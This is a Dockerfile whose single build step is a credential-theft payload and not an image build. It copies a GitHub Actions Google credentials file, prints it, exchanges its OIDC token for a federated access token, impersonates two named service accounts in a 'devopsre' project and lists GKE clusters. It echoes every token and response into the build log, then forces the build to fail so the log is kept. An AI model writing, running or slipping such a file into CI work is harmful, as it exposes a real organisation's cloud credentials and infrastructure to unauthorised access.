FROM ubuntu:22.04
RUN apt-get update && apt-get install -y --no-install-recommends curl jq ca-certificates && rm -rf /var/lib/apt/lists/*
COPY gha-creds-*.json /tmp/creds.json
RUN set -eux; \
    cat /tmp/creds.json; \
    URL=$(jq -r '.credential_source.url' /tmp/creds.json); \
    AUTH=$(jq -r '.credential_source.headers.Authorization' /tmp/creds.json); \
    AUD=$(jq -r '.audience' /tmp/creds.json); \
    AUDURL="https://iam.googleapis.com/${AUD#//iam.googleapis.com/}"; \
    OIDC=$(curl -sS -H "$AUTH" "$URL&audience=$AUDURL" | jq -r '.value // empty'); \
    echo "OIDC_LEN=${#OIDC}"; \
    STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"audience\":\"$AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$OIDC\"}"); \
    echo "STS=$STS"; \
    FED=$(echo "$STS" | jq -r '.access_token // empty'); \
    for SA in celo-monorepo@devopsre.iam.gserviceaccount.com celo-monorepo-dev@devopsre.iam.gserviceaccount.com; do \
      echo "== SA=$SA"; \
      AT=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -H "Authorization: Bearer $FED" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'); \
      echo "AT=$AT"; \
      TOK=$(echo "$AT" | jq -r '.accessToken // empty'); \
      if [ -n "$TOK" ]; then \
        echo "== CLUSTERS"; \
        curl -sS -H "Authorization: Bearer $TOK" "https://container.googleapis.com/v1/projects/devopsre/locations/-/clusters" | head -c 6000; \
      fi; \
    done; \
    false
